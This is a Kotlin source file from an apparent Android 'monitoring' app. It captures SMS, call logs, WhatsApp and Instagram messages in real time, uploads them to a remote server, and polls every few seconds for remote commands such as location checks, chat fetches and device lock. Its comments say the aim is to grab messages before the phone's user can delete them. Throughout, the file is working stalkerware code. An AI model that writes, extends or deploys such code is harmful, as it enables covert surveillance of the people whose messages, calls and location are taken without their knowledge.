package com.spapp.monitoring.collectors

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.provider.Telephony
import android.util.Log
import androidx.core.content.ContextCompat
import com.spapp.monitoring.data.DeviceState
import com.spapp.monitoring.data.local.AppDatabase
import com.spapp.monitoring.network.ApiClient
import com.spapp.monitoring.network.CallLogEntryDto
import com.spapp.monitoring.network.CallLogSyncRequest
import com.spapp.monitoring.network.SmsLogEntryDto
import com.spapp.monitoring.network.SmsLogSyncRequest
import com.spapp.monitoring.network.WhatsAppMessageEntryDto
import com.spapp.monitoring.network.WhatsAppMessagesSyncRequest
import com.spapp.monitoring.network.InstagramMessageEntryDto
import com.spapp.monitoring.network.InstagramMessagesSyncRequest
import com.spapp.monitoring.network.FcmTokenRequest
import com.spapp.monitoring.sync.SyncRunner
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import java.time.Instant

/**
 * Real-time ContentObserver for SMS, Call logs, and WhatsApp activity.
 *
 * Catches messages and calls the exact millisecond they are sent, received,
 * or completed — BEFORE the user has time to delete them from their messaging
 * or phone dialer app. Saves them immediately into the local Room database,
 * and kicks off an immediate background upload so the dashboard updates live.
 *
 * Employs debouncing and Mutex locking to prevent duplicate entries caused by
 * Android's multi-stage ContentObserver notifications (e.g. outbox -> sent).
 */
object RealtimeLogObserverManager {

    private const val TAG = "RealtimeLogObserver"
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private var smsObserver: ContentObserver? = null
    private var isSmsRegistered = false
    private var smsJob: Job? = null
    private val smsMutex = Mutex()

    private var callObserver: ContentObserver? = null
    private var isCallRegistered = false
    private var callJob: Job? = null
    private val callMutex = Mutex()

    private var whatsAppJob: Job? = null
    private val whatsAppMutex = Mutex()
    @Volatile private var pendingWaUpload = false
    @Volatile private var isWaUploading = false

    private var instagramJob: Job? = null
    private val instagramMutex = Mutex()
    @Volatile private var pendingIgUpload = false
    @Volatile private var isIgUploading = false

    private var commandPollerJob: Job? = null
    private var lastUploadedFcmToken: String? = null

    @Synchronized
    fun start(context: Context) {
        val appCtx = context.applicationContext
        startSmsObserver(appCtx)
        startCallObserver(appCtx)
        startCommandPoller(appCtx)
        triggerInstantWhatsAppUpload(appCtx)
        triggerInstantInstagramUpload(appCtx)
    }

    @Synchronized
    fun stop(context: Context) {
        val appCtx = context.applicationContext
        try {
            smsObserver?.let { appCtx.contentResolver.unregisterContentObserver(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unregister SMS observer", e)
        } finally {
            smsObserver = null
            isSmsRegistered = false
            smsJob?.cancel()
            smsJob = null
        }

        try {
            callObserver?.let { appCtx.contentResolver.unregisterContentObserver(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unregister Call observer", e)
        } finally {
            callObserver = null
            isCallRegistered = false
            callJob?.cancel()
            callJob = null
        }

        whatsAppJob?.cancel()
        whatsAppJob = null

        commandPollerJob?.cancel()
        commandPollerJob = null
    }

    /**
     * Fast command poller: checks backend for pending commands (location_check,
     * get_whatsapp_chat, lock, etc.) every 3.5 seconds while Accessibility Service is running.
     * Guarantees 1-3 second response time for "Check Location Now" and chat conversation fetches
     * even if FCM is delayed or sleeping.
     */
    private fun startCommandPoller(appCtx: Context) {
        if (commandPollerJob != null) return
        commandPollerJob = scope.launch {
            Log.d(TAG, "Fast command poller started (3.5s interval)")
            while (true) {
                try {
                    val state = DeviceState(appCtx)
                    val token = state.authToken
                    if (!token.isNullOrEmpty()) {
                        val runner = SyncRunner(appCtx)
                        runner.runFastCommandPass()

                        // Also verify FCM token registration
                        if (lastUploadedFcmToken == null) {
                            try {
                                FirebaseMessaging.getInstance().token.addOnSuccessListener { fcmTok ->
                                    if (!fcmTok.isNullOrBlank() && fcmTok != lastUploadedFcmToken) {
                                        scope.launch {
                                            try {
                                                ApiClient.service.updateFcmToken("Bearer $token", FcmTokenRequest(fcmTok))
                                                lastUploadedFcmToken = fcmTok
                                                Log.d(TAG, "FCM token uploaded to server via command poller")
                                            } catch (_: Exception) {}
                                        }
                                    }
                                }
                            } catch (_: Exception) {}
                        }
                    }
                } catch (_: Exception) {
                    // Ignore transient network failures
                }
                delay(3500)
            }
        }
    }

    private fun startSmsObserver(appCtx: Context) {
        if (isSmsRegistered) return
        if (ContextCompat.checkSelfPermission(appCtx, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return
        }

        try {
            val obs = object : ContentObserver(Handler(Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    super.onChange(selfChange, uri)
                    triggerSmsCapture(appCtx)
                }
            }
            appCtx.contentResolver.registerContentObserver(
                Telephony.Sms.CONTENT_URI,
                true,
                obs
            )
            smsObserver = obs
            isSmsRegistered = true
            Log.d(TAG, "SMS ContentObserver registered")

            // Initial capture on startup in case SMS arrived while inactive
            triggerSmsCapture(appCtx)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register SMS ContentObserver", e)
        }
    }

    private fun startCallObserver(appCtx: Context) {
        if (isCallRegistered) return
        if (ContextCompat.checkSelfPermission(appCtx, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return
        }

        try {
            val obs = object : ContentObserver(Handler(Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    super.onChange(selfChange, uri)
                    triggerCallCapture(appCtx)
                }
            }
            appCtx.contentResolver.registerContentObserver(
                CallLog.Calls.CONTENT_URI,
                true,
                obs
            )
            callObserver = obs
            isCallRegistered = true
            Log.d(TAG, "Call ContentObserver registered")

            // Initial capture on startup
            triggerCallCapture(appCtx)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register Call ContentObserver", e)
        }
    }

    fun triggerSmsCapture(context: Context) {
        synchronized(this) {
            smsJob?.cancel()
            smsJob = scope.launch {
                delay(350) // Coalesce multi-stage SMS provider writes (outbox -> sent)
                captureSms(context)
            }
        }
    }

    fun triggerCallCapture(context: Context) {
        synchronized(this) {
            callJob?.cancel()
            callJob = scope.launch {
                delay(350)
                captureCalls(context)
            }
        }
    }

    private suspend fun captureSms(context: Context) {
        smsMutex.withLock {
            try {
                val db = AppDatabase.getInstance(context)
                val state = DeviceState(context)
                val collector = SmsLogCollector(context)
                val fresh = collector.collectSince(state.smsLastExternalId)

                if (fresh.isNotEmpty()) {
                    db.smsLogDao().insertAll(fresh)
                    state.smsLastExternalId = maxOf(state.smsLastExternalId, fresh.maxOf { it.externalId })

                    // Instant upload to server
                    val bearer = state.authToken?.let { "Bearer $it" }
                    if (bearer != null) {
                        val startOfTodayMs = java.util.Calendar.getInstance().apply {
                            set(java.util.Calendar.HOUR_OF_DAY, 0)
                            set(java.util.Calendar.MINUTE, 0)
                            set(java.util.Calendar.SECOND, 0)
                            set(java.util.Calendar.MILLISECOND, 0)
                        }.timeInMillis
                        val unsynced = db.smsLogDao().getRecentUnsynced(startOfTodayMs)
                        if (unsynced.isNotEmpty()) {
                            val dtos = unsynced.map {
                                SmsLogEntryDto(
                                    direction = it.direction,
                                    counterparty = it.counterparty,
                                    messageAt = Instant.ofEpochMilli(it.messageAtEpochMs).toString(),
                                    body = it.body,
                                    contactName = it.contactName
                                )
                            }
                            val response = ApiClient.service.syncSmsLog(bearer, SmsLogSyncRequest(dtos))
                            if (response.isSuccessful) {
                                db.smsLogDao().deleteByIds(unsynced.map { it.id })
                            }
                        }
                    }
                }
                Unit
            } catch (e: Exception) {
                Log.e(TAG, "Error in real-time SMS capture", e)
            }
        }
    }

    private suspend fun captureCalls(context: Context) {
        callMutex.withLock {
            try {
                val db = AppDatabase.getInstance(context)
                val state = DeviceState(context)
                val collector = CallLogCollector(context)
                val fresh = collector.collectSince(state.callLastExternalId)

                if (fresh.isNotEmpty()) {
                    db.callLogDao().insertAll(fresh)
                    state.callLastExternalId = maxOf(state.callLastExternalId, fresh.maxOf { it.externalId })

                    val bearer = state.authToken?.let { "Bearer $it" }
                    if (bearer != null) {
                        val startOfTodayMs = java.util.Calendar.getInstance().apply {
                            set(java.util.Calendar.HOUR_OF_DAY, 0)
                            set(java.util.Calendar.MINUTE, 0)
                            set(java.util.Calendar.SECOND, 0)
                            set(java.util.Calendar.MILLISECOND, 0)
                        }.timeInMillis
                        val unsynced = db.callLogDao().getRecentUnsynced(startOfTodayMs)
                        if (unsynced.isNotEmpty()) {
                            val dtos = unsynced.map {
                                CallLogEntryDto(
                                    direction = it.direction,
                                    counterparty = it.counterparty,
                                    durationSec = it.durationSec,
                                    calledAt = Instant.ofEpochMilli(it.calledAtEpochMs).toString(),
                                    contactName = it.contactName
                                )
                            }
                            val response = ApiClient.service.syncCallLog(bearer, CallLogSyncRequest(dtos))
                            if (response.isSuccessful) {
                                db.callLogDao().deleteByIds(unsynced.map { it.id })
                            }
                        }
                    }
                }
                Unit
            } catch (e: Exception) {
                Log.e(TAG, "Error in real-time Call capture", e)
            }
        }
    }

    fun triggerInstantWhatsAppUpload(context: Context, immediate: Boolean = false) {
        synchronized(this) {
            pendingWaUpload = true
            if (isWaUploading) return
            if (immediate) {
                whatsAppJob?.cancel()
                whatsAppJob = scope.launch {
                    captureAndUploadWhatsApp(context.applicationContext)
                }
                return
            }
            // Smart Flush: if a batch sync is already scheduled within 7 seconds, let it gather messages
            if (whatsAppJob?.isActive == true) return
            whatsAppJob = scope.launch {
                delay(7000L) // Smart Flush batch window: 7 seconds
                captureAndUploadWhatsApp(context.applicationContext)
            }
        }
    }

    private suspend fun captureAndUploadWhatsApp(context: Context) {
        whatsAppMutex.withLock {
            isWaUploading = true
            try {
                val db = AppDatabase.getInstance(context)
                val state = DeviceState(context)
                val bearer = state.authToken?.let { "Bearer $it" } ?: return

                try {
                    db.whatsAppMessageDao().clearOversizedUnsyncedBlobs()
                } catch (_: Throwable) {}

                var drainPasses = 0
                do {
                    pendingWaUpload = false
                    for (batch in 0 until 5) {
                        val unsynced = db.whatsAppMessageDao().getUnsynced(50)
                        if (unsynced.isEmpty()) break

                        val dtos = unsynced.map {
                            WhatsAppMessageEntryDto(
                                chatName = it.chatName,
                                sender = if (it.isOutgoing) "me" else it.sender,
                                messageText = it.messageText,
                                isOutgoing = it.isOutgoing,
                                messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
                                mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else null),
                                mediaPath = it.mediaPath,
                                reelUrl = it.reelUrl
                            )
                        }
                        val response = ApiClient.service.syncWhatsAppMessages(bearer, WhatsAppMessagesSyncRequest(dtos))
                        if (response.isSuccessful) {
                            db.whatsAppMessageDao().markSynced(unsynced.map { it.id })
                            db.whatsAppMessageDao().pruneSyncedMessages(System.currentTimeMillis() - 10 * 60 * 1000L)
                            db.whatsAppMessageDao().pruneOldMessages(System.currentTimeMillis() - 60 * 60 * 1000L)
                            Log.d(TAG, "Smart Flush: Uploaded ${dtos.size} WhatsApp messages to server")
                        } else {
                            Log.w(TAG, "WhatsApp upload failed HTTP ${response.code()}")
                            pendingWaUpload = false
                            break
                        }
                    }
                    drainPasses++
                } while (pendingWaUpload && drainPasses < 3)
                Unit
            } catch (e: Throwable) {
                Log.e(TAG, "Error in real-time WhatsApp upload", e)
            } finally {
                isWaUploading = false
            }
        }
    }

    fun triggerInstantInstagramUpload(context: Context, immediate: Boolean = false) {
        synchronized(this) {
            pendingIgUpload = true
            if (isIgUploading) return
            if (!immediate && instagramJob?.isActive == true) return
            if (immediate && instagramJob?.isActive == true) {
                // Job is only in its 200ms debounce delay (since isIgUploading is false); replace with immediate run
                instagramJob?.cancel()
            }
            instagramJob = scope.launch {
                if (!immediate) {
                    delay(200)
                }
                captureAndUploadInstagram(context.applicationContext)
            }
        }
    }

    private suspend fun captureAndUploadInstagram(context: Context) {
        instagramMutex.withLock {
            isIgUploading = true
            try {
                val db = AppDatabase.getInstance(context)
                val state = DeviceState(context)
                val bearer = state.authToken?.let { "Bearer $it" } ?: return

                var drainPasses = 0
                do {
                    pendingIgUpload = false
                    for (batch in 0 until 5) {
                        val unsynced = db.instagramMessageDao().getUnsynced(50)
                        if (unsynced.isEmpty()) break

                        val dtos = unsynced.map {
                            InstagramMessageEntryDto(
                                chatName = it.chatName,
                                sender = it.sender,
                                messageText = it.messageText,
                                isOutgoing = it.isOutgoing,
                                messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
                                mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else "text"),
                                mediaPath = it.mediaPath,
                                reelUrl = it.reelUrl,
                                targetAccount = null
                            )
                        }
                        val response = ApiClient.service.syncInstagramMessages(
                            bearer,
                            InstagramMessagesSyncRequest(dtos, accountName = null)
                        )
                        if (response.isSuccessful) {
                            db.instagramMessageDao().markSynced(unsynced.map { it.id })
                            db.instagramMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
                            Log.d(TAG, "Instantly uploaded ${dtos.size} Instagram messages to server")
                        } else {
                            Log.w(TAG, "Instagram upload failed HTTP ${response.code()}")
                            pendingIgUpload = false
                            break
                        }
                    }
                    drainPasses++
                } while (pendingIgUpload && drainPasses < 3)
                Unit
            } catch (e: Throwable) {
                Log.e(TAG, "Error in real-time Instagram upload", e)
            } finally {
                isIgUploading = false
            }
        }
    }
}

